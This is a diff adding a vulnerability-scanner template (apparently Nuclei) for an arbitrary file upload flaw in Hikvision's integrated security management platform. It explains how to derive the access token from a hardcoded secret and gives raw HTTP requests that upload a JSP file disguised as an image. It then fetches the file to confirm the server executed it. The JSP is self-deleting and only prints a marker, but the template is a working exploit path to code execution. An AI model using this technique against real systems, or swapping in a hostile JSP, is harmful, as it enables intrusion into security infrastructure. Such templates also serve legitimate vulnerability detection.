@@ -1,0 +1,40 @@
+id: hikvision-isms-resource-upload
+info:
+  name: HIKVISION 海康威视 综合安防管理平台 resourceOperations 接口任意文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    该接口允许攻击者通过构造特定请求上传任意文件。当目标地址为http://www.example.com/时，Token值由MD5算法生成，计算方式为MD5(http://www.example.com/eps/api/resourceOperations/uploadsecretKeyIbuilding)，结果为54590E37F79DF000549B9FAA536D23B3。
+      漏洞披露日期：2023-12-04
+  tags: HIKVISION
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /eps/api/resourceOperations/upload?token=Token HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTJyhtTNqdMNLZLhj
+    Accept-Encoding: gzip, deflate
+    Connection: close
+
+    ------WebKitFormBoundaryTJyhtTNqdMNLZLhj
+    Content-Disposition: form-data; name="fileUploader"; filename="NTest.jsp"
+    Content-Type: image/jpeg
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    ------WebKitFormBoundaryTJyhtTNqdMNLZLhj--
+- raw:
+  - |
+    GET /NTest.jsp HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
